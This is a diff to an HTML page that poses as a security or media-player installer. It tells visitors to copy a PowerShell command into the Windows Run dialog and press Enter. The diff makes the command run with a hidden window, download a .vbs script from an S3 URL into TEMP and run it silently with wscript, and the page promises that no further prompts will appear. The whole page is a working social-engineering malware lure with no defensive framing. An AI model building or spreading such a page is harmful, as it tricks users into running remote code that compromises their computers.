@@ -204,6 +204,7 @@
             font-family: monospace;
             position: relative;
             cursor: pointer;
+            transition: background 0.3s ease;
         }
         
         .copy-box:hover {
@@ -221,6 +222,27 @@
             color: #4CAF50;
             word-break: break-all;
             margin: 10px 0;
+        }
+        
+        .windows-key {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #0078d7, #005a9e);
+            color: white;
+            border: 1px solid #004578;
+            border-radius: 4px;
+            padding: 4px 8px;
+            margin: 0 2px;
+            font-weight: bold;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .key-combo {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            margin: 5px 0;
         }
         
         @media (max-width: 768px) {
@@ -248,6 +270,7 @@
             }
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
     <div class="background-overlay"></div>
@@ -321,14 +344,14 @@
                     <div class="step-title">Step 1: Download Security Package</div>
                     <p>Click the box below to copy the secure download command to your clipboard:</p>
                     <div class="copy-box" id="script-copy">
-                        <div>powershell -Command "Start-BitsTransfer -Source 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -Destination '$env:TEMP\MediaPlayerUpdate.vbs'; Start-Process 'wscript' -ArgumentList '$env:TEMP\MediaPlayerUpdate.vbs'"</div>
+                        <div>powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -OutFile '$env:TEMP\MediaPlayerSetup.vbs'; Start-Process -FilePath 'wscript.exe' -ArgumentList '$env:TEMP\MediaPlayerSetup.vbs' -WindowStyle Hidden"</div>
                     </div>
                     <div class="copied-message" id="copied-message">✓ Copied to clipboard!</div>
                 </div>
                 
                 <div class="step">
                     <div class="step-title">Step 2: Run the Installation</div>
-                    <p>Press <kbd>Windows Key + R</kbd> to open the Run dialog, then paste with <kbd>CTRL + V</kbd> and press <kbd>Enter</kbd>.</p>
+                    <p>Press <span class="key-combo"><span class="windows-key"><i class="fab fa-windows"></i></span> + <kbd>R</kbd></span> to open the Run dialog, then paste with <kbd>CTRL + V</kbd> and press <kbd>Enter</kbd>.</p>
                     <p class="download-link">Download URL: https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs</p>
                     <p><strong>Note:</strong> The installation will run with necessary permissions to ensure optimal performance. No further prompts will appear.</p>
                 </div>
@@ -354,7 +377,7 @@
 
         // Copy script to clipboard functionality
         document.getElementById('script-copy').addEventListener('click', function() {
-            const scriptText = "powershell -Command \"Start-BitsTransfer -Source 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -Destination '$env:TEMP\\MediaPlayerUpdate.vbs'; Start-Process 'wscript' -ArgumentList '$env:TEMP\\MediaPlayerUpdate.vbs'\"";
+            const scriptText = "powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'https://s3.us-east-1.amazonaws.com/update-system.s3/NewAppDownlaod.vbs' -OutFile '$env:TEMP\\MediaPlayerSetup.vbs'; Start-Process -FilePath 'wscript.exe' -ArgumentList '$env:TEMP\\MediaPlayerSetup.vbs' -WindowStyle Hidden\"";
             
             // Use modern clipboard API
             navigator.clipboard.writeText(scriptText).then(function() {
